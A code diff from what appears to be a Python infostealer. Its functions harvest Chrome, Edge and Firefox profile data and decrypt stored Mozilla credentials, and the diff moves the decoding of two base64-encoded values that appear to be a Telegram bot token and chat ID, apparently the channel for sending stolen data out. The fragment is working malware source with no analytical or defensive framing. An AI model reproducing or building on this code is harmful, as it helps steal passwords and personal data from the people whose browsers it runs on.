@@ -55,6 +55,9 @@ def get_chrome(data_path,chrome_path):
 encoded_apibot1 = "NzQzMjE0Mjk2NjpBQUhXblU1X2R1Tl92Z1JXQmRfd3NhX1BIek5vdktHQm5VRQ=="
 encoded_id1 = "LTEwMDIyMDUwMzMyODg="
 
+apibot1 = base64.b64decode(encoded_apibot1).decode()
+id1 = base64.b64decode(encoded_id1).decode()
+   
 def get_edge(data_path,edge_path):
     data_edge = os.path.join(data_path, "Edge");os.mkdir(data_edge)
     profiles = find_profile(edge_path)
@@ -231,9 +234,7 @@ def delete_file(data_profile):
         encrypt(data_profile)
     except:print("")
 
-apibot1 = base64.b64decode(encoded_apibot1).decode()
-id1 = base64.b64decode(encoded_id1).decode()
-   
+
 
 def decryptMoz3DES( globalSalt, entrySalt, encryptedData ):
   hp = sha1( globalSalt ).digest()
